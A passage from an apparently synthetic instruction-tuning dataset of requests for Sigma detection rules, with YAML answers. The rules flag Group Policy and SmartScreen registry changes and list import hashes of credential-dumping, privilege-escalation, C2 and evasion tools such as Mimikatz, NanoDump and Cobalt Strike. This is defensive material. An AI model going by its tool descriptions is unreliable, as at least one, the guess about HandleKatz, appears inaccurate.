characteristics is an indicator of compromise and suggests the presence of Qakbot malware within the system. Given the sophistication and potentially severe impact of a Qakbot infection, such detections are treated with a high level of suspicion, and the likelihood of false positives is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect malicious GPO modifications can be used to implement many other malicious behaviors..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect malicious GPO modifications can be used to implement many other malicious behaviors, you should: Monitor Windows PowerShell script activity for specific script block text that involves references to the Windows Group Policy Objects (GPO) settings. This involves checking for any script content that contains access or modifications to registry paths related to system policies, such as \"\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\". Specifically, watch out for the manipulation of registry keys associated with Group Policy refresh intervals (`GroupPolicyRefreshTimeDC`, `GroupPolicyRefreshTimeOffsetDC`, `GroupPolicyRefreshTime`, `GroupPolicyRefreshTimeOffset`), and settings that pertain to Windows Defender SmartScreen (`EnableSmartScreen`, `ShellSmartScreenLevel`). These modifications can indicate attempts to alter system policies or security settings in a way that could undermine system security or assist in further malicious activities. The detection process hinges on having Script Block Logging enabled in Windows PowerShell, allowing for comprehensive tracking of script execution. Be mindful of legitimate alterations to these settings, which can result in false positives. The threat level associated with this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_path:\n        ScriptBlockText|contains: \\SOFTWARE\\Policies\\Microsoft\\Windows\\System\n    selection_key:\n        ScriptBlockText|contains:\n            - GroupPolicyRefreshTimeDC\n            - GroupPolicyRefreshTimeOffsetDC\n            - GroupPolicyRefreshTime\n            - GroupPolicyRefreshTimeOffset\n            - EnableSmartScreen\n            - ShellSmartScreenLevel\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_path:\n        ScriptBlockText|contains: \\SOFTWARE\\Policies\\Microsoft\\Windows\\System\n    selection_key:\n        ScriptBlockText|contains:\n            - GroupPolicyRefreshTimeDC\n            - GroupPolicyRefreshTimeOffsetDC\n            - GroupPolicyRefreshTime\n            - GroupPolicyRefreshTimeOffset\n            - EnableSmartScreen\n            - ShellSmartScreenLevel\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "Detect malicious GPO modifications can be used to implement many other malicious behaviors.",
      "answer": "In order to detect malicious GPO modifications can be used to implement many other malicious behaviors, you should: Monitor Windows PowerShell script activity for specific script block text that involves references to the Windows Group Policy Objects (GPO) settings. This involves checking for any script content that contains access or modifications to registry paths related to system policies, such as \"\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\". Specifically, watch out for the manipulation of registry keys associated with Group Policy refresh intervals (`GroupPolicyRefreshTimeDC`, `GroupPolicyRefreshTimeOffsetDC`, `GroupPolicyRefreshTime`, `GroupPolicyRefreshTimeOffset`), and settings that pertain to Windows Defender SmartScreen (`EnableSmartScreen`, `ShellSmartScreenLevel`). These modifications can indicate attempts to alter system policies or security settings in a way that could undermine system security or assist in further malicious activities. The detection process hinges on having Script Block Logging enabled in Windows PowerShell, allowing for comprehensive tracking of script execution. Be mindful of legitimate alterations to these settings, which can result in false positives. The threat level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed, you should monitor process creation logs on Windows systems for specific import hashes that are known to be associated with various hacking tools and malware. These import hashes are unique to certain binaries or executable files used in attacks and can be used to identify malicious activity even when attackers rename the files to evade detection. Specifically, look for process creation events where the imphash matches any of the following:\n\n- A series of hashes related to the PetitPotam exploit which can be used for NTLM relay attacks in Active Directory environments.\n- Multiple hashes for Mimikatz, a well-known tool used for harvesting credentials from Windows systems.\n- Various hashes for JuicyPotato, JuicyPotatoNG, and RoguePotato, which are utilities exploiting permission issues to escalate privileges.\n- Several hashes identifying instances of Pwdump and PwDumpX, tools for extracting password hashes from Windows.\n- Hashes for Htran, which is used for proxying network traffic to obscure the source of attacks.\n- Cobalt Strike beacons indicated by specific hashes, which represent command and control software used in attacks.\n- Identifiers for PPLDump, a utility to dump protected process memory, critical for bypassing system protections.\n- NanoDump hashes, for a tool that specifically targets dumping credentials and other sensitive information stealthily.\n- HandleKatz, which presumably relates to Kerberos ticket handling and manipulation.\n- DripLoader detections using its unique imphashes, a method of evading antivirus detections when delivering payloads.\n- Import hashes corresponding to UACMe, a collection of methods for bypassing User Account Control (UAC).\n- Specific hashes for Windows Credential Editor (WCE), used for editing or removing Windows credentials.\n- Indicators for Sliver, an adversary simulation framework, similar to Cobalt Strike but open source.\n- Hashes relating to Dumpert, a tool for memory dumping designed to evade defensive measures.\n- Signature hashes for evidence of SysmonEnte, SysmonQuiet usage, and ShaprEvtMute Hook, which can indicate sophisticated evasion techniques against system monitoring.\n\nIt\u2019s critical to understand that, due to the nature of these tools, there might be false positives\u2014legitimate uses of these utilities for administrative purposes. Therefore, each detection should be carefully reviewed to confirm malicious intent. The level of threat for this behavior is considered critical due to the potential for these tools to be used in credential theft, privilege escalation, lateral movement, or establishing a persistent threat within the network.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Imphash:\n            - bcca3c247b619dcd13c8cdff5f123932 # PetitPotam\n            - 3a19059bd7688cb88e70005f18efc439 # PetitPotam\n            - bf6223a49e45d99094406777eb6004ba # PetitPotam\n            - 0c106686a31bfe2ba931ae1cf6e9dbc6 # Mimikatz\n            - 0d1447d4b3259b3c2a1d4cfb7ece13c3 # Mimikatz\n            - 1b0369a1e06271833f78ffa70ffb4eaf # Mimikatz\n            - 4c1b52a19748428e51b14c278d0f58e3 # Mimikatz\n            - 4d927a711f77d62cebd4f322cb57ec6f # Mimikatz\n            - 66ee036df5fc1004d9ed5e9a94a1086a # Mimikatz\n            - 672b13f4a0b6f27d29065123fe882dfc # Mimikatz\n            - 6bbd59cea665c4afcc2814c1327ec91f # Mimikatz\n            - 725bb81dc24214f6ecacc0cfb36ad30d # Mimikatz\n            - 9528a0e91e28fbb88ad433feabca2456 # Mimikatz\n            - 9da6d5d77be11712527dcab86df449a3 # Mimikatz\n            - a6e01bc1ab89f8d91d9eab72032aae88 # Mimikatz\n            - b24c5eddaea4fe50c6a96a2a133521e4 # Mimikatz\n            - d21bbc50dcc169d7b4d0f01962793154 # Mimikatz\n            - fcc251cceae90d22c392215cc9a2d5d6 # Mimikatz\n            - 23867a89c2b8fc733be6cf5ef902f2d1 # JuicyPotato\n            - a37ff327f8d48e8a4d2f757e1b6e70bc # JuicyPotato\n            - f9a28c458284584a93b14216308d31bd # JuicyPotatoNG\n            - 6118619783fc175bc7ebecff0769b46e # RoguePotato\n            - 959a83047e80ab68b368fdb3f4c6e4ea # RoguePotato\n            - 563233bfa169acc7892451f71ad5850a # RoguePotato\n            - 87575cb7a0e0700eb37f2e3668671a08 # RoguePotato\n            - 13f08707f759af6003837a150a371ba1 # Pwdump\n            - 1781f06048a7e58b323f0b9259be798b # Pwdump\n            - 233f85f2d4bc9d6521a6caae11a1e7f5 # Pwdump\n            - 24af2584cbf4d60bbe5c6d1b31b3be6d # Pwdump\n            - 632969ddf6dbf4e0f53424b75e4b91f2 # Pwdump\n            - 713c29b396b907ed71a72482759ed757 # Pwdump\n            - 749a7bb1f0b4c4455949c0b2bf7f9e9f # Pwdump\n            - 8628b2608957a6b0c6330ac3de28ce2e # Pwdump\n            - 8b114550386e31895dfab371e741123d # Pwdump\n            - 94cb940a1a6b65bed4d5a8f849ce9793 # PwDumpX\n            - 9d68781980370e00e0bd939ee5e6c141 # Pwdump\n            - b18a1401ff8f444056d29450fbc0a6ce # Pwdump\n            - cb567f9498452721d77a451374955f5f # Pwdump\n            - 730073214094cd328547bf1f72289752 # Htran\n            - 17b461a082950fc6332228572138b80c # Cobalt Strike beacons\n            - dc25ee78e2ef4d36faa0badf1e7461c9 # Cobalt Strike beacons\n            - 819b19d53ca6736448f9325a85736792 # Cobalt Strike beacons\n            - 829da329ce140d873b4a8bde2cbfaa7e # Cobalt Strike beacons\n            - c547f2e66061a8dffb6f5a3ff63c0a74 # PPLDump\n            - 0588081ab0e63ba785938467e1b10cca # PPLDump\n            - 0d9ec08bac6c07d9987dfd0f1506587c # NanoDump\n            - bc129092b71c89b4d4c8cdf8ea590b29 # NanoDump\n            - 4da924cf622d039d58bce71cdf05d242 # NanoDump\n            - e7a3a5c377e2d29324093377d7db1c66 # NanoDump\n            - 9a9dbec5c62f0380b4fa5fd31deffedf # NanoDump\n            - af8a3976ad71e5d5fdfb67ddb8dadfce # NanoDump\n            - 0c477898bbf137bbd6f2a54e3b805ff4 # NanoDump\n            - 0ca9f02b537bcea20d4ea5eb1a9fe338 # NanoDump\n            - 3ab3655e5a14d4eefc547f4781bf7f9e # NanoDump\n            - e6f9d5152da699934b30daab206471f6 # NanoDump\n            - 3ad59991ccf1d67339b319b15a41b35d # NanoDump\n            - ffdd59e0318b85a3e480874d9796d872 # NanoDump\n            - 0cf479628d7cc1ea25ec7998a92f5051 # NanoDump\n            - 07a2d4dcbd6cb2c6a45e6b101f0b6d51 # NanoDump\n            - d6d0f80386e1380d05cb78e871bc72b1 # NanoDump\n            - 38d9e015591bbfd4929e0d0f47fa0055 # HandleKatz\n            - 0e2216679ca6e1094d63322e3412d650 # HandleKatz\n            - ada161bf41b8e5e9132858cb54cab5fb # DripLoader\n            - 2a1bc4913cd5ecb0434df07cb675b798 # DripLoader\n            - 11083e75553baae21dc89ce8f9a195e4 # DripLoader\n            - a23d29c9e566f2fa8ffbb79267f5df80 # DripLoader\n            - 4a07f944a83e8a7c2525efa35dd30e2f # CreateMiniDump\n            - 767637c23bb42cd5d7397cf58b0be688 # UACMe Akagi\n            - 14c4e4c72ba075e9069ee67f39188ad8 # UACMe Akagi\n            - 3c782813d4afce07bbfc5a9772acdbdc # UACMe Akagi\n            - 7d010c6bb6a3726f327f7e239166d127 # UACMe Akagi\n            - 89159ba4dd04e4ce5559f132a9964eb3 # UACMe Akagi\n            - 6f33f4a5fc42b8cec7314947bd13f30f # UACMe Akagi\n            - 5834ed4291bdeb928270428ebbaf7604 # UACMe Akagi\n            - 5a8a8a43f25485e7ee1b201edcbc7a38 # UACMe Akagi\n            - dc7d30b90b2d8abf664fbed2b1b59894 # UACMe Akagi\n            - 41923ea1f824fe63ea5beb84db7a3e74 # UACMe Akagi\n            - 3de09703c8e79ed2ca3f01074719906b # UACMe Akagi\n            - a53a02b997935fd8eedcb5f7abab9b9f # WCE\n            - e96a73c7bf33a464c510ede582318bf2 # WCE\n            - 32089b8851bbf8bc2d014e9f37288c83 # Sliver Stagers\n            - 09D278F9DE118EF09163C6140255C690 # Dumpert\n            - 03866661686829d806989e2fc5a72606 # Dumpert\n            - e57401fbdadcd4571ff385ab82bd5d6d # Dumpert\n            - 84B763C45C0E4A3E7CA5548C710DB4EE # SysmonEnte\n            - 19584675d94829987952432e018d5056 # SysmonQuiet\n            - 330768a4f172e10acb6287b87289d83b # ShaprEvtMute Hook\n        - Hashes|contains: # Sysmon field hashes contains all types\n            - IMPHASH=BCCA3C247B619DCD13C8CDFF5F123932 # PetitPotam\n            - IMPHASH=3A19059BD7688CB88E70005F18EFC439 # PetitPotam\n            - IMPHASH=bf6223a49e45d99094406777eb6004ba # PetitPotam\n            - IMPHASH=0C106686A31BFE2BA931AE1CF6E9DBC6 # Mimikatz\n            - IMPHASH=0D1447D4B3259B3C2A1D4CFB7ECE13C3 # Mimikatz\n            - IMPHASH=1B0369A1E06271833F78FFA70FFB4EAF # Mimikatz\n            - IMPHASH=4C1B52A19748428E51B14C278D0F58E3 # Mimikatz\n            - IMPHASH=4D927A711F77D62CEBD4F322CB57EC6F # Mimikatz\n            - IMPHASH=66EE036DF5FC1004D9ED5E9A94A1086A # Mimikatz\n            - IMPHASH=672B13F4A0B6F27D29065123FE882DFC # Mimikatz\n            - IMPHASH=6BBD59CEA665C4AFCC2814C1327EC91F # Mimikatz\n            - IMPHASH=725BB81DC24214F6ECACC0CFB36AD30D # Mimikatz\n            - IMPHASH=9528A0E91E28FBB88AD433FEABCA2456 # Mimikatz\n            - IMPHASH=9DA6D5D77BE11712527DCAB86DF449A3 # Mimikatz\n            - IMPHASH=A6E01BC1AB89F8D91D9EAB72032AAE88 # Mimikatz\n            - IMPHASH=B24C5EDDAEA4FE50C6A96A2A133521E4 # Mimikatz\n            - IMPHASH=D21BBC50DCC169D7B4D0F01962793154 # Mimikatz\n            - IMPHASH=FCC251CCEAE90D22C392215CC9A2D5D6 # Mimikatz\n            - IMPHASH=23867A89C2B8FC733BE6CF5EF902F2D1 # JuicyPotato\n            - IMPHASH=A37FF327F8D48E8A4D2F757E1B6E70BC # JuicyPotato\n            - IMPHASH=F9A28C458284584A93B14216308D31BD # JuicyPotatoNG\n            - IMPHASH=6118619783FC175BC7EBECFF0769B46E # RoguePotato\n            - IMPHASH=959A83047E80AB68B368FDB3F4C6E4EA # RoguePotato\n            - IMPHASH=563233BFA169ACC7892451F71AD5850A # RoguePotato\n            - IMPHASH=87575CB7A0E0700EB37F2E3668671A08 # RoguePotato\n            - IMPHASH=13F08707F759AF6003837A150A371BA1 # Pwdump\n            - IMPHASH=1781F06048A7E58B323F0B9259BE798B # Pwdump\n            - IMPHASH=233F85F2D4BC9D6521A6CAAE11A1E7F5 # Pwdump\n            - IMPHASH=24AF2584CBF4D60BBE5C6D1B31B3BE6D # Pwdump\n            - IMPHASH=632969DDF6DBF4E0F53424B75E4B91F2 # Pwdump\n            - IMPHASH=713C29B396B907ED71A72482759ED757 # Pwdump\n            - IMPHASH=749A7BB1F0B4C4455949C0B2BF7F9E9F # Pwdump\n            - IMPHASH=8628B2608957A6B0C6330AC3DE28CE2E # Pwdump\n            - IMPHASH=8B114550386E31895DFAB371E741123D # Pwdump\n            - IMPHASH=94CB940A1A6B65BED4D5A8F849CE9793 # PwDumpX\n            - IMPHASH=9D68781980370E00E0BD939EE5E6C141 # Pwdump\n            - IMPHASH=B18A1401FF8F444056D29450FBC0A6CE # Pwdump\n            - IMPHASH=CB567F9498452721D77A451374955F5F # Pwdump\n            - IMPHASH=730073214094CD328547BF1F72289752 # Htran\n            - IMPHASH=17B461A082950FC6332228572138B80C # Cobalt Strike beacons\n            - IMPHASH=DC25EE78E2EF4D36FAA0BADF1E7461C9 # Cobalt Strike beacons\n            - IMPHASH=819B19D53CA6736448F9325A85736792 # Cobalt Strike beacons\n            - IMPHASH=829DA329CE140D873B4A8BDE2CBFAA7E # Cobalt Strike beacons\n            - IMPHASH=C547F2E66061A8DFFB6F5A3FF63C0A74 # PPLDump\n            - IMPHASH=0588081AB0E63BA785938467E1B10CCA # PPLDump\n            - IMPHASH=0D9EC08BAC6C07D9987DFD0F1506587C # NanoDump\n            - IMPHASH=BC129092B71C89B4D4C8CDF8EA590B29 # NanoDump\n            - IMPHASH=4DA924CF622D039D58BCE71CDF05D242 # NanoDump\n            - IMPHASH=E7A3A5C377E2D29324093377D7DB1C66 # NanoDump\n            - IMPHASH=9A9DBEC5C62F0380B4FA5FD31DEFFEDF # NanoDump\n            - IMPHASH=AF8A3976AD71E5D5FDFB67DDB8DADFCE # NanoDump\n            - IMPHASH=0C477898BBF137BBD6F2A54E3B805FF4 # NanoDump\n            - IMPHASH=0CA9F02B537BCEA20D4EA5EB1A9FE338 # NanoDump\n            - IMPHASH=3AB3655E5A14D4EEFC547F4781BF7F9E # NanoDump\n            - IMPHASH=E6F9D5152DA699934B30DAAB206471F6 # NanoDump\n            - IMPHASH=3AD59991CCF1D67339B319B15A41B35D # NanoDump\n            - IMPHASH=FFDD59E0318B85A3E480874D9796D872 # NanoDump\n            - IMPHASH=0CF479628D7CC1EA25EC7998A92F5051 # NanoDump\n            - IMPHASH=07A2D4DCBD6CB2C6A45E6B101F0B6D51 # NanoDump\n            - IMPHASH=D6D0F80386E1380D05CB78E871BC72B1 # NanoDump\n            - IMPHASH=38D9E015591BBFD4929E0D0F47FA0055 # HandleKatz\n            - IMPHASH=0E2216679CA6E1094D63322E3412D650 # HandleKatz\n            - IMPHASH=ADA161BF41B8E5E9132858CB54CAB5FB # DripLoader\n            - IMPHASH=2A1BC4913CD5ECB0434DF07CB675B798 # DripLoader\n            - IMPHASH=11083E75553BAAE21DC89CE8F9A195E4 # DripLoader\n            - IMPHASH=A23D29C9E566F2FA8FFBB79267F5DF80 # DripLoader\n            - IMPHASH=4A07F944A83E8A7C2525EFA35DD30E2F # CreateMiniDump\n            - IMPHASH=767637C23BB42CD5D7397CF58B0BE688 # UACMe Akagi\n            - IMPHASH=14C4E4C72BA075E9069EE67F39188AD8 # UACMe Akagi\n            - IMPHASH=3C782813D4AFCE07BBFC5A9772ACDBDC # UACMe Akagi\n            - IMPHASH=7D010C6BB6A3726F327F7E239166D127 # UACMe Akagi\n            - IMPHASH=89159BA4DD04E4CE5559F132A9964EB3 # UACMe Akagi\n            - IMPHASH=6F33F4A5FC42B8CEC7314947BD13F30F # UACMe Akagi\n            - IMPHASH=5834ED4291BDEB928270428EBBAF7604 # UACMe Akagi\n            - IMPHASH=5A8A8A43F25485E7EE1B201EDCBC7A38 # UACMe Akagi\n            - IMPHASH=DC7D30B90B2D8ABF664FBED2B1B59894 # UACMe Akagi\n            - IMPHASH=41923EA1F824FE63EA5BEB84DB7A3E74 # UACMe Akagi\n            - IMPHASH=3DE09703C8E79ED2CA3F01074719906B # UACMe Akagi\n            - IMPHASH=A53A02B997935FD8EEDCB5F7ABAB9B9F # WCE\n            - IMPHASH=E96A73C7BF33A464C510EDE582318BF2 # WCE\n            - IMPHASH=32089B8851BBF8BC2D014E9F37288C83 # Sliver Stagers\n            - IMPHASH=09D278F9DE118EF09163C6140255C690 # Dumpert\n            - IMPHASH=03866661686829d806989e2fc5a72606 # Dumpert\n            - IMPHASH=e57401fbdadcd4571ff385ab82bd5d6d # Dumpert\n            - IMPHASH=84B763C45C0E4A3E7CA5548C710DB4EE # SysmonEnte\n            - IMPHASH=19584675D94829987952432E018D5056 # SysmonQuiet\n            - IMPHASH=330768A4F172E10ACB6287B87289D83B # ShaprEvtMute Hook\n    condition: selection\nfalsepositives:\n    - Legitimate use of one of these tools\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Imphash:\n            - bcca3c247b619dcd13c8cdff5f123932 # PetitPotam\n            - 3a19059bd7688cb88e70005f18efc439 # PetitPotam\n            - bf6223a49e45d99094406777eb6004ba # PetitPotam\n            - 0c106686a31bfe2ba931ae1cf6e9dbc6 # Mimikatz\n            - 0d1447d4b3259b3c2a1d4cfb7ece13c3 # Mimikatz\n            - 1b0369a1e06271833f78ffa70ffb4eaf # Mimikatz\n            - 4c1b52a19748428e51b14c278d0f58e3 # Mimikatz\n            - 4d927a711f77d62cebd4f322cb57ec6f # Mimikatz\n            - 66ee036df5fc1004d9ed5e9a94a1086a # Mimikatz\n            - 672b13f4a0b6f27d29065123fe882dfc # Mimikatz\n            - 6bbd59cea665c4afcc2814c1327ec91f # Mimikatz\n            - 725bb81dc24214f6ecacc0cfb36ad30d # Mimikatz\n            - 9528a0e91e28fbb88ad433feabca2456 # Mimikatz\n            - 9da6d5d77be11712527dcab86df449a3 # Mimikatz\n            - a6e01bc1ab89f8d91d9eab72032aae88 # Mimikatz\n            - b24c5eddaea4fe50c6a96a2a133521e4 # Mimikatz\n            - d21bbc50dcc169d7b4d0f01962793154 # Mimikatz\n            - fcc251cceae90d22c392215cc9a2d5d6 # Mimikatz\n            - 23867a89c2b8fc733be6cf5ef902f2d1 # JuicyPotato\n            - a37ff327f8d48e8a4d2f757e1b6e70bc # JuicyPotato\n            - f9a28c458284584a93b14216308d31bd # JuicyPotatoNG\n            - 6118619783fc175bc7ebecff0769b46e # RoguePotato\n            - 959a83047e80ab68b368fdb3f4c6e4ea # RoguePotato\n            - 563233bfa169acc7892451f71ad5850a # RoguePotato\n            - 87575cb7a0e0700eb37f2e3668671a08 # RoguePotato\n            - 13f08707f759af6003837a150a371ba1 # Pwdump\n            - 1781f06048a7e58b323f0b9259be798b # Pwdump\n            - 233f85f2d4bc9d6521a6caae11a1e7f5 # Pwdump\n            - 24af2584cbf4d60bbe5c6d1b31b3be6d # Pwdump\n            - 632969ddf6dbf4e0f53424b75e4b91f2 # Pwdump\n            - 713c29b396b907ed71a72482759ed757 # Pwdump\n            - 749a7bb1f0b4c4455949c0b2bf7f9e9f # Pwdump\n            - 8628b2608957a6b0c6330ac3de28ce2e # Pwdump\n            - 8b114550386e31895dfab371e741123d # Pwdump\n            - 94cb940a1a6b65bed4d5a8f849ce9793 # PwDumpX\n            - 9d68781980370e00e0bd939ee5e6c141 # Pwdump\n            - b18a1401ff8f444056d29450fbc0a6ce # Pwdump\n            - cb567f9498452721d77a451374955f5f # Pwdump\n            - 730073214094cd328547bf1f72289752 # Htran\n            - 17b461a082950fc6332228572138b80c # Cobalt Strike beacons\n            - dc25ee78e2ef4d36faa0badf1e7461c9 # Cobalt Strike beacons\n            - 819b19d53ca6736448f9325a85736792 # Cobalt Strike beacons\n            - 829da329ce140d873b4a8bde2cbfaa7e # Cobalt Strike beacons\n            - c547f2e66061a8dffb6f5a3ff63c0a74 # PPLDump\n            - 0588081ab0e63ba785938467e1b10cca # PPLDump\n            - 0d9ec08bac6c07d9987dfd0f1506587c # NanoDump\n            - bc129092b71c89b4d4c8cdf8ea590b29 # NanoDump\n            - 4da924cf622d039d58bce71cdf05d242 # NanoDump\n            - e7a3a5c377e2d29324093377d7db1c66 # NanoDump\n            - 9a9dbec5c62f0380b4fa5fd31deffedf # NanoDump\n            - af8a3976ad71e5d5fdfb67ddb8dadfce # NanoDump\n            - 0c477898bbf137bbd6f2a54e3b805ff4 # NanoDump\n            - 0ca9f02b537bcea20d4ea5eb1a9fe338 # NanoDump\n            - 3ab3655e5a14d4eefc547f4781bf7f9e # NanoDump\n            - e6f9d5152da699934b30daab206471f6 # NanoDump\n            - 3ad59991ccf1d67339b319b15a41b35d # NanoDump\n            - ffdd59e0318b85a3e480874d9796d872 # NanoDump\n            - 0cf479628d7cc1ea25ec7998a92f5051 # NanoDump\n            - 07a2d4dcbd6cb2c6a45e6b101f0b6d51 # NanoDump\n            - d6d0f80386e1380d05cb78e871bc72b1 # NanoDump\n            - 38d9e015591bbfd4929e0d0f47fa0055 # HandleKatz\n            - 0e2216679ca6e1094d63322e3412d650 # HandleKatz\n            - ada161bf41b8e5e9132858cb54cab5fb # DripLoader\n            - 2a1bc4913cd5ecb0434df07cb675b798 # DripLoader\n            - 11083e75553baae21dc89ce8f9a195e4 # DripLoader\n            - a23d29c9e566f2fa8ffbb79267f5df80 # DripLoader\n            - 4a07f944a83e8a7c2525efa35dd30e2f # CreateMiniDump\n            - 767637c23bb42cd5d7397cf58b0be688 # UACMe Akagi\n            - 14c4e4c72ba075e9069ee67f39188ad8 # UACMe Akagi\n            - 3c782813d4afce07bbfc5a9772acdbdc # UACMe Akagi\n            - 7d010c6bb6a3726f327f7e239166d127 # UACMe Akagi\n            - 89159ba4dd04e4ce5559f132a9964eb3 # UACMe Akagi\n            - 6f33f4a5fc42b8cec7314947bd13f30f # UACMe Akagi\n            - 5834ed4291bdeb928270428ebbaf7604 # UACMe Akagi\n            - 5a8a8a43f25485e7ee1b201edcbc7a38 # UACMe Akagi\n            - dc7d30b90b2d8abf664fbed2b1b59894 # UACMe Akagi\n            - 41923ea1f824fe63ea5beb84db7a3e74 # UACMe Akagi\n            - 3de09703c8e79ed2ca3f01074719906b # UACMe Akagi\n            - a53a02b997935fd8eedcb5f7abab9b9f # WCE\n            - e96a73c7bf33a464c510ede582318bf2 # WCE\n            - 32089b8851bbf8bc2d014e9f37288c83 # Sliver Stagers\n            - 09D278F9DE118EF09163C6140255C690 # Dumpert\n            - 03866661686829d806989e2fc5a72606 # Dumpert\n            - e57401fbdadcd4571ff385ab82bd5d6d # Dumpert\n            - 84B763C45C0E4A3E7CA5548C710DB4EE # SysmonEnte\n            - 19584675d94829987952432e018d5056 # SysmonQuiet\n            - 330768a4f172e10acb6287b87289d83b # ShaprEvtMute Hook\n        - Hashes|contains: # Sysmon field hashes contains all types\n            - IMPHASH=BCCA3C247B619DCD13C8CDFF5F123932 # PetitPotam\n            - IMPHASH=3A19059BD7688CB88E70005F18EFC439 # PetitPotam\n            - IMPHASH=bf6223a49e45d99094406777eb6004ba # PetitPotam\n            - IMPHASH=0C106686A31BFE2BA931AE1CF6E9DBC6 # Mimikatz\n            - IMPHASH=0D1447D4B3259B3C2A1D4CFB7ECE13C3 # Mimikatz\n            - IMPHASH=1B0369A1E06271833F78FFA70FFB4EAF # Mimikatz\n            - IMPHASH=4C1B52A19748428E51B14C278D0F58E3 # Mimikatz\n            - IMPHASH=4D927A711F77D62CEBD4F322CB57EC6F # Mimikatz\n            - IMPHASH=66EE036DF5FC1004D9ED5E9A94A1086A # Mimikatz\n            - IMPHASH=672B13F4A0B6F27D29065123FE882DFC # Mimikatz\n            - IMPHASH=6BBD59CEA665C4AFCC2814C1327EC91F # Mimikatz\n            - IMPHASH=725BB81DC24214F6ECACC0CFB36AD30D # Mimikatz\n            - IMPHASH=9528A0E91E28FBB88AD433FEABCA2456 # Mimikatz\n            - IMPHASH=9DA6D5D77BE11712527DCAB86DF449A3 # Mimikatz\n            - IMPHASH=A6E01BC1AB89F8D91D9EAB72032AAE88 # Mimikatz\n            - IMPHASH=B24C5EDDAEA4FE50C6A96A2A133521E4 # Mimikatz\n            - IMPHASH=D21BBC50DCC169D7B4D0F01962793154 # Mimikatz\n            - IMPHASH=FCC251CCEAE90D22C392215CC9A2D5D6 # Mimikatz\n            - IMPHASH=23867A89C2B8FC733BE6CF5EF902F2D1 # JuicyPotato\n            - IMPHASH=A37FF327F8D48E8A4D2F757E1B6E70BC # JuicyPotato\n            - IMPHASH=F9A28C458284584A93B14216308D31BD # JuicyPotatoNG\n            - IMPHASH=6118619783FC175BC7EBECFF0769B46E # RoguePotato\n            - IMPHASH=959A83047E80AB68B368FDB3F4C6E4EA # RoguePotato\n            - IMPHASH=563233BFA169ACC7892451F71AD5850A # RoguePotato\n            - IMPHASH=87575CB7A0E0700EB37F2E3668671A08 # RoguePotato\n            - IMPHASH=13F08707F759AF6003837A150A371BA1 # Pwdump\n            - IMPHASH=1781F06048A7E58B323F0B9259BE798B # Pwdump\n            - IMPHASH=233F85F2D4BC9D6521A6CAAE11A1E7F5 # Pwdump\n            - IMPHASH=24AF2584CBF4D60BBE5C6D1B31B3BE6D # Pwdump\n            - IMPHASH=632969DDF6DBF4E0F53424B75E4B91F2 # Pwdump\n            - IMPHASH=713C29B396B907ED71A72482759ED757 # Pwdump\n            - IMPHASH=749A7BB1F0B4C4455949C0B2BF7F9E9F # Pwdump\n            - IMPHASH=8628B2608957A6B0C6330AC3DE28CE2E # Pwdump\n            - IMPHASH=8B114550386E31895DFAB371E741123D # Pwdump\n            - IMPHASH=94CB940A1A6B65BED4D5A8F849CE9793 # PwDumpX\n            - IMPHASH=9D68781980370E00E0BD939EE5E6C141 # Pwdump\n            - IMPHASH=B18A1401FF8F444056D29450FBC0A6CE # Pwdump\n            - IMPHASH=CB567F9498452721D77A451374955F5F # Pwdump\n            - IMPHASH=730073214094CD328547BF1F72289752 # Htran\n            - IMPHASH=17B461A082950FC6332228572138B80C # Cobalt Strike beacons\n            - IMPHASH=DC25EE78E2EF4D36FAA0BADF1E7461C9 # Cobalt Strike beacons\n            - IMPHASH=819B19D53CA6736448F9325A85736792 # Cobalt Strike beacons\n            - IMPHASH=829DA329CE140D873B4A8BDE2CBFAA7E # Cobalt Strike beacons\n            - IMPHASH=C547F2E66061A8DFFB6F5A3FF63C0A74 # PPLDump\n            - IMPHASH=0588081AB0E63BA785938467E1B10CCA # PPLDump\n            - IMPHASH=0D9EC08BAC6C07D9987DFD0F1506587C # NanoDump\n            - IMPHASH=BC129092B71C89B4D4C8CDF8EA590B29 # NanoDump\n            - IMPHASH=4DA924CF622D039D58BCE71CDF05D242 # NanoDump\n            - IMPHASH=E7A3A5C377E2D29324093377D7DB1C66 # NanoDump\n            - IMPHASH=9A9DBEC5C62F0380B4FA5FD31DEFFEDF # NanoDump\n            - IMPHASH=AF8A3976AD71E5D5FDFB67DDB8DADFCE # NanoDump\n            - IMPHASH=0C477898BBF137BBD6F2A54E3B805FF4 # NanoDump\n            - IMPHASH=0CA9F02B537BCEA20D4EA5EB1A9FE338 # NanoDump\n            - IMPHASH=3AB3655E5A14D4EEFC547F4781BF7F9E # NanoDump\n            - IMPHASH=E6F9D5152DA699934B30DAAB206471F6 # NanoDump\n            - IMPHASH=3AD59991CCF1D67339B319B15A41B35D # NanoDump\n            - IMPHASH=FFDD59E0318B85A3E480874D9796D872 # NanoDump\n            - IMPHASH=0CF479628D7CC1EA25EC7998A92F5051 # NanoDump\n            - IMPHASH=07A2D4DCBD6CB2C6A45E6B101F0B6D51 # NanoDump\n            - IMPHASH=D6D0F80386E1380D05CB78E871BC72B1 # NanoDump\n            - IMPHASH=38D9E015591BBFD4929E0D0F47FA0055 # HandleKatz\n            - IMPHASH=0E2216679CA6E1094D63322E3412D650 # HandleKatz\n            - 